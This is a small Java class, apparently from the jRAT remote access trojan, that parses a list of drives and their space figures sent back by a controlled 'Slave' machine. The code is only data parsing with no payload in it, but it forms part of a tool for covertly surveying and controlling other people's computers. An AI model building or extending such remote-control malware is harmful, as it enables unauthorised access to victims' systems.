package io.jrat.client.packets.incoming;

import io.jrat.client.Drive;
import io.jrat.client.Slave;

import java.io.DataInputStream;


public class Packet62InitDrives extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int len = slave.readInt();

		slave.setDrives(new Drive[len]);

		for (int i = 0; i < len; i++) {
			Drive drive = new Drive();
			drive.setName(slave.readLine());
			drive.setTotalSpace(slave.readShort());
			drive.setFreeSpace(slave.readShort());
			drive.setUsableSpace(slave.readShort());
			slave.getDrives()[i] = drive;
		}
	}

}
